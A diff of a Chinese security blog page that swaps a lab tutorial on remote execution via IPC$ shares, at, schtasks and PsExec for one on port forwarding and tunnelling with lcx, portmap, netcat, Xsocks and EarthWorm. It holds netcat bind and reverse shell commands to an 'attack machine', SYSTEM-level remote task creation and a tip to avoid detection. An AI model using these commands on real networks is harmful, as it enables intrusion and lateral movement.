@@ -115,17 +115,36 @@
 
 
 
-<meta name="description" content="内网渗透基础之共享连接及定时任务，稍微总结了下，写的东西都比较浅。">
+<meta name="description" content="这一篇写的是关于端口转发的一些基础知识，同时也简略的写了常用工具的基本使用方法。争取通过这篇文章让自己对代理与端口转发有个基本印象。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="任务执行和建立共享">
-<meta property="og:url" content="http://yoursite.com/2020/01/18/任务执行和建立共享/index.html">
+<meta property="og:title" content="代理与端口转发">
+<meta property="og:url" content="http://yoursite.com/2020/01/19/代理与端口转发/index.html">
 <meta property="og:site_name" content="Bu1&#39;Blog">
-<meta property="og:description" content="内网渗透基础之共享连接及定时任务，稍微总结了下，写的东西都比较浅。">
+<meta property="og:description" content="这一篇写的是关于端口转发的一些基础知识，同时也简略的写了常用工具的基本使用方法。争取通过这篇文章让自己对代理与端口转发有个基本印象。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-01-18T11:49:21.837Z">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119114447868.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119114459626.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119114653489.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119120358477.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119120435753.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119120652259.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119121019657.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119123102436.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119123212021.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119123445891.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119140557619.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119140527057.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119142208308.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119142802786.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119142819630.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119143248617.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119143612521.png">
+<meta property="og:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119143927325.png">
+<meta property="og:updated_time" content="2020-01-19T06:39:37.358Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="任务执行和建立共享">
-<meta name="twitter:description" content="内网渗透基础之共享连接及定时任务，稍微总结了下，写的东西都比较浅。">
+<meta name="twitter:title" content="代理与端口转发">
+<meta name="twitter:description" content="这一篇写的是关于端口转发的一些基础知识，同时也简略的写了常用工具的基本使用方法。争取通过这篇文章让自己对代理与端口转发有个基本印象。">
+<meta name="twitter:image" content="http://yoursite.com/2020/01/19/代理与端口转发/image-20200119114447868.png">
 
 
 
@@ -155,13 +174,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/01/18/任务执行和建立共享/">
+  <link rel="canonical" href="http://yoursite.com/2020/01/19/代理与端口转发/">
 
 
 
 
 
-  <title>任务执行和建立共享 | Bu1'Blog</title>
+  <title>代理与端口转发 | Bu1'Blog</title>
   
 
 
@@ -288,7 +307,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/18/任务执行和建立共享/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/19/代理与端口转发/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Bu1">
@@ -305,7 +324,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">任务执行和建立共享</h1>
+          <h1 class="post-title" itemprop="name headline">代理与端口转发</h1>
         
 
         <div class="post-meta">
@@ -317,8 +336,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-18T16:06:54+08:00">
-                2020-01-18
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-19T11:30:01+08:00">
+                2020-01-19
               </time>
             
 
@@ -358,8 +377,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2020/01/18/任务执行和建立共享/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/01/18/任务执行和建立共享/" itemprop="commentCount"></span>
+                <a href="/2020/01/19/代理与端口转发/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/01/19/代理与端口转发/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -381,7 +400,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  914 字
+                  1.2k 字
                 </span>
               
 
@@ -397,7 +416,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3 分钟
+                  4 分钟
                 </span>
               
             </div>
@@ -418,95 +437,80 @@
       
 
       
-        <p>内网渗透基础之共享连接及定时任务，稍微总结了下，写的东西都比较浅。</p>
+        <p>这一篇写的是关于端口转发的一些基础知识，同时也简略的写了常用工具的基本使用方法。争取通过这篇文章让自己对代理与端口转发有个基本印象。</p>
 <a id="more"></a>
 
-<h1 id="共享连接"><a href="#共享连接" class="headerlink" title="共享连接"></a>共享连接</h1><h2 id="ipc"><a href="#ipc" class="headerlink" title="ipc$"></a>ipc$</h2><p>IPC$(Internet Process Connection)是共享 “命名管道 “的资源(大家都是这么说的)，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。</p>
-<p><strong>如果远程服务器未开启139、445端口，无法使用IPC$进行连接；在同一时间内，两个ip之间只允许建立一个连接。</strong></p>
+<h1 id="正向代理与反向代理"><a href="#正向代理与反向代理" class="headerlink" title="正向代理与反向代理"></a>正向代理与反向代理</h1><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>正向代理就像一个跳板，比如ABC三个IP，A能访问B，B能访问C，A不能访问C，那么，正向代理就是A去访问B，告诉B自己要访问C的什么内容，然后B去代替A来访问，接着把访问到的内容返回A，这样就相当于A访问到了C。</p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119114447868.png" alt="image-20200119114447868"></p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119114459626.png" alt="image-20200119114459626"></p>
+<h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>反向代理是我们经常用到的一种代理方式，因为它可以有效的穿透防火墙，这也是很多网站保护集群的一种做法，他们将内网中的web（A）代理到外网的一台服务器（B）上，当用户访问这台服务器（B）时，他们以为自己访问的是原始的web（A）</p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119114653489.png" alt="image-20200119114653489"></p>
+<h1 id="Windows-lcx端口转发"><a href="#Windows-lcx端口转发" class="headerlink" title="Windows lcx端口转发"></a>Windows lcx端口转发</h1><p>这是一个window下使用的端口转发工具，常用命令如下：</p>
+<ol>
+<li>-listen  监听p1,接收由p2转发过来的数据</li>
+<li>-tran   端口转向功能，通过访问该端口可以直接与该主机或另一台主机的某一个端口进行通信</li>
+<li>-slave    端口转发功能，将目标A机上的端口A,转发到外网B机的端口B上</li>
+</ol>
+<p>在实际渗透过程中，主要用到的还是1和3功能，下面我们就在本地实验环境实际使用一下。</p>
 <blockquote>
-<p>在初次安装系统时还打开了默认共享，即所有的逻辑共享(c$,d$,e$……)和系统目录winnt或管理员目录(admin$)共享。</p>
+<p>内网机ip:192.168.226.137</p>
+<p>边界机ip:192.168.226.139(内)，192.168.226.143(外)</p>
 </blockquote>
-<h2 id="建立ipc-连接"><a href="#建立ipc-连接" class="headerlink" title="建立ipc$连接"></a>建立ipc$连接</h2><ul>
-<li>net use \\192.168.3.122\ipc$ /u:”” “” 先空连接探测</li>
-<li>net use  查看当前机器中的ipc连接有哪些</li>
-<li>net use \\192.168.3.122\ipc$ “password” /user:admin  有密码的连接</li>
-<li>net use \\192.168.3.122\ipc$ /del       #删除指定ipc连接</li>
-<li>net use * /del    #删除所有连接</li>
-<li>net share  查看共享</li>
-<li>删除共享(重启后默认共享仍然存在)<ul>
-<li>net share ipc$ /delete</li>
-<li>net share admin$ /delete</li>
-<li>net share c$ /delete</li>
-<li>net share d$ /delete </li>
-<li>… e,f盘类似</li>
-</ul>
-</li>
-</ul>
-<h2 id="检验ipc-连接"><a href="#检验ipc-连接" class="headerlink" title="检验ipc$连接"></a>检验ipc$连接</h2><ul>
-<li>dir \\192.169.226.139\c$  查看远程连接对象的目录</li>
-</ul>
-<h2 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h2><ul>
-<li>copy calc.bat \\192.169.226.139\c$  传输文件</li>
-</ul>
-<h2 id="硬盘映射"><a href="#硬盘映射" class="headerlink" title="硬盘映射"></a>硬盘映射</h2><ul>
-<li>net use p:  \\192.168.226.139\c$  映射远控机器的C盘到本地</li>
-<li>net use p:  /del     删除映射(实际的渗透过程中应该尽可能缩短映射时间防止被发现)</li>
-</ul>
-<h1 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h1><h2 id="At命令"><a href="#At命令" class="headerlink" title="At命令"></a>At命令</h2><ul>
-<li><p>建立任务</p>
-<p>win7以前一般是使用“AT”命令进行定时操作。一般在ipc$连接后可以开始定时任务。命令格式： at \\计算机名字或者ip 执行时间 程序目录</p>
-<p><code>假如执行C盘下的脚本:at \\192.168.226.139 11:30 c:\\calc.bat</code></p>
-</li>
-<li><p>清除任务</p>
-<p><code>at \\192.168.226.139 id /delete</code></p>
-<p><strong>id为空则会删除所有的作业</strong> </p>
-</li>
-<li><p>执行任务</p>
-<p><code>at \\192.168.226.139 11:30 cmd.exe /c &quot;ipconfig &gt; c:\1.txt&quot;</code></p>
-<p><strong>由于没有回显结果，所以可以存储在文本文件中查看命令执行后的回显</strong></p>
-</li>
-</ul>
-<h2 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h2><p>win7以后可使用schtasks，这个命令的好处在于可以更加灵活的控制脚本的启动时间。</p>
+<p>物理机是无法直接与内网机相连接的，但是物理机是可以与边界机相连的。内网机将流量通过端口转发到边界机，边界机监听本地端口后可以让物理机访问到内网机的流量，以远程连接(3389端口)为例：</p>
 <ul>
-<li><p>创建任务</p>
-<p><code>schtasks /create /s 192.168.226.139 /tn name /sc onstart /tr c:\calc.bat /ru system /f</code></p>
+<li><p>内网机 <code>lcx.exe -slave 192.168.226.139 55 192.168.226.137 3389</code></p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119120358477.png" alt="image-20200119120358477"></p>
+</li>
+<li><p>边界机 <code>lcx.exe -listen 55 49999</code></p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119120435753.png" alt="image-20200119120435753"></p>
+</li>
+<li><p>物理机</p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119120652259.png" alt="image-20200119120652259"></p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119121019657.png" alt="image-20200119121019657"></p>
+</li>
+</ul>
+<h1 id="Linux下的portmap端口转发"><a href="#Linux下的portmap端口转发" class="headerlink" title="Linux下的portmap端口转发"></a>Linux下的portmap端口转发</h1><p>portmap的使用方法与在Windows下使用lcx类似：</p>
+<ol>
+<li><p>将目标的3389端口转发到本地的55端口</p>
+<p><code>./portmap -m 1 -p1 3389 -h2 ip -p2 55</code></p>
+</li>
+<li><p>监听55端口并将数据转发到4999端口</p>
+<p><code>./portmap -m 2 -p1 1234 -p2 4999</code></p>
+</li>
+</ol>
+<h1 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h1><h2 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h2><p>以本次的实验环境为例，在边界机上将cmd的流量代理到8888端口<code>nc.exe -l -p 8888 -e cmd.exe</code></p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119123102436.png" alt="image-20200119123102436"></p>
+<p>在物理机上执行命令<code>nc.exe -nvv 192.168.226.143 8888</code></p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119123212021.png" alt="image-20200119123212021"></p>
+<p>主动连接到了边界机的8888端口拿到了cmd.exe的执行权限。<code>start http://www.baidu.com</code> 物理机成功控制边界机弹出浏览器并打开指定网站</p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119123445891.png" alt="image-20200119123445891"></p>
+<h2 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h2><p>在边界机上执行命令<code>nc.exe -e cmd.exe 192.168.1.103 8889</code>,此时边界机的cmd.exe流量将转发到攻击机的8889端口。</p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119140557619.png" alt="image-20200119140557619"></p>
+<p>在物理(外网)机上执行命令<code>nc.exe -l -p 8889</code>,此时将监听本地的8889端口获取反弹的shell</p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119140527057.png" alt="image-20200119140527057"></p>
+<p><strong>注意：内网机命令执行后等待时间短，应在结束前在物理机上执行监听命令</strong></p>
+<h1 id="Xsocks"><a href="#Xsocks" class="headerlink" title="Xsocks"></a>Xsocks</h1><p>Xsocks在常用的windows与linux下都可以使用，而且能够设置ssocks服务的密码，这里以它的正向代理socks5代理功能来进行实验。</p>
 <blockquote>
-<p> onstart代表任务在每次系统启动的时候运行 ，name是为任务取得名字</p>
+<p>边界机ip:  192.168.70.145 端口1080</p>
+<p>内网机ip:  172.17.18.6</p>
+<p>物理机ip:  192.168.70.129(kali)</p>
 </blockquote>
-</li>
-<li><p>激活任务</p>
-<p><code>schtasks /run /s 192.168.226.139 /i /tn &quot;name&quot;</code></p>
-</li>
-<li><p>删除任务</p>
-<p><code>schtasks /delete /s 192.168.226.139 /tn &quot;name&quot; /f</code></p>
-</li>
-</ul>
-<p><strong>注意：这个命令在使用时会产生大量的日志</strong></p>
-<h2 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h2><p>第一次使用会弹窗，输入–accepteula这个参数就可以绕过。</p>
-<ul>
-<li><p>执行任务</p>
-<p><code>psexec.exe \\ip –accepteula -u username -p password program.exe</code></p>
-</li>
-<li><p>假如已经建立ipc连接</p>
-<p><code>psexec.exe \\ip –accepteula cmd.exe</code></p>
-</li>
-<li><p>骚操作(-s 管理员 -i 靶机是否能看到 –d命令执行后返回)</p>
-<ul>
-<li>psexec \\ip -u admini -p pwd -d -s calc   管理员权限且靶机不显示</li>
-<li>psexec \\ip -u admini -p pwd -i -d cmd /c start http:// <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>  靶机打开浏览器且靶机弹窗</li>
-<li>psexec \\ip -u admin -p pwd -s cmd 此条命令会反弹靶机的cmd到本机</li>
-</ul>
-</li>
-</ul>
+<p>在边界机上执行命令<code>xsocks.exe -l 1080</code>开启流量转发</p>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>在windows下我们使用proxifier来进行流量代理，只需要在Proxy Servers中设置好边界机的ip地址及流量代理端口即可。</p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119142208308.png" alt="image-20200119142208308"></p>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>在proxychains文件中修改代理设置，使用代理访问即可。</p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119142802786.png" alt="image-20200119142802786"></p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119142819630.png" alt="image-20200119142819630"></p>
+<h1 id="Earthworm"><a href="#Earthworm" class="headerlink" title="Earthworm"></a>Earthworm</h1><p>EW 是一套便携式的网络穿透工具，它具有 SOCKS v5服务架设和端口转发两大 核心功能，可以帮助我们在复杂的网络环境下完成网络穿透，它支持多平台，借 用了 ssocks 和 lcx.exe 的操作逻辑，并进行更多的功能强化。</p>
 <blockquote>
-<p>cmd建立非空文件命令</p>
-<ul>
-<li>copy con 1.txt 创建文件并开始输入内容 ctrl+z 后加回车键结束输入</li>
-<li>echo 内容 &gt; 1.txt 将内容输出到1.txt</li>
-<li>echo 内容 &gt;&gt; 1.txt 将内容追加到1.txt</li>
-<li>type 1.txt 查看文件内容</li>
-</ul>
+<p>实验环境与上文Xscoks相同</p>
 </blockquote>
+<h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><p>边界机执行命令<code>ew -s ssocksd -l 1080</code>将流量反弹出去，在windows(外网攻击机)下使用proxifier连接。</p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119143248617.png" alt="image-20200119143248617"></p>
+<h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><p>在kali(外网攻击机)下先执行命令<code>./ew -s rcsocks -l 1080 -e 8888</code>监听本机1080端口，同时修改proxychains文件的代理配置</p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119143612521.png" alt="image-20200119143612521"></p>
+<p>在边界机下执行命令<code>./ew -s rssocks -d 192.168.70.129 -e 8888</code>将本机流量发送到kali(攻击机)的8888端口</p>
+<p><img src="/2020/01/19/代理与端口转发/image-20200119143927325.png" alt="image-20200119143927325"></p>
 
       
     </div>
@@ -527,7 +531,7 @@
   </li>
 <li class="post-copyright-link">
   <strong>本文链接：</strong>
-  <a href="http://bu1.github.io/2020/01/18/任务执行和建立共享/" title="任务执行和建立共享">http://bu1.github.io/2020/01/18/任务执行和建立共享/</a>
+  <a href="http://bu1.github.io/2020/01/19/代理与端口转发/" title="代理与端口转发">http://bu1.github.io/2020/01/19/代理与端口转发/</a>
 </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -557,8 +561,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/01/17/内网渗透基础之信息收集/" rel="next" title="内网渗透基础之信息收集">
-                <i class="fa fa-chevron-left"></i> 内网渗透基础之信息收集
+              <a href="/2020/01/18/任务执行和建立共享/" rel="next" title="任务执行和建立共享">
+                <i class="fa fa-chevron-left"></i> 任务执行和建立共享
               </a>
             
           </div>
@@ -566,10 +570,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/01/19/代理与端口转发/" rel="prev" title="代理与端口转发">
-                代理与端口转发 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -728,7 +728,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#共享连接"><span class="nav-number">1.</span> <span class="nav-text">共享连接</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ipc"><span class="nav-number">1.1.</span> <span class="nav-text">ipc$</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#建立ipc-连接"><span class="nav-number">1.2.</span> <span class="nav-text">建立ipc$连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#检验ipc-连接"><span class="nav-number">1.3.</span> <span class="nav-text">检验ipc$连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#传输文件"><span class="nav-number">1.4.</span> <span class="nav-text">传输文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#硬盘映射"><span class="nav-number">1.5.</span> <span class="nav-text">硬盘映射</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#定时任务"><span class="nav-number">2.</span> <span class="nav-text">定时任务</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#At命令"><span class="nav-number">2.1.</span> <span class="nav-text">At命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#schtasks"><span class="nav-number">2.2.</span> <span class="nav-text">schtasks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Psexec"><span class="nav-number">2.3.</span> <span class="nav-text">Psexec</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#正向代理与反向代理"><span class="nav-number">1.</span> <span class="nav-text">正向代理与反向代理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#正向代理"><span class="nav-number">1.1.</span> <span class="nav-text">正向代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反向代理"><span class="nav-number">1.2.</span> <span class="nav-text">反向代理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows-lcx端口转发"><span class="nav-number">2.</span> <span class="nav-text">Windows lcx端口转发</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux下的portmap端口转发"><span class="nav-number">3.</span> <span class="nav-text">Linux下的portmap端口转发</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NC"><span class="nav-number">4.</span> <span class="nav-text">NC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#正向连接"><span class="nav-number">4.1.</span> <span class="nav-text">正向连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反向连接"><span class="nav-number">4.2.</span> <span class="nav-text">反向连接</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Xsocks"><span class="nav-number">5.</span> <span class="nav-text">Xsocks</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows"><span class="nav-number">5.1.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux"><span class="nav-number">5.2.</span> <span class="nav-text">Linux</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Earthworm"><span class="nav-number">6.</span> <span class="nav-text">Earthworm</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-1"><span class="nav-number">6.1.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-1"><span class="nav-number">6.2.</span> <span class="nav-text">Linux</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -900,9 +900,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://yoursite.com/2020/01/18/任务执行和建立共享/';
-          this.page.identifier = '2020/01/18/任务执行和建立共享/';
-          this.page.title = '任务执行和建立共享';
+          this.page.url = 'http://yoursite.com/2020/01/19/代理与端口转发/';
+          this.page.identifier = '2020/01/19/代理与端口转发/';
+          this.page.title = '代理与端口转发';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://.disqus.com/embed.js';
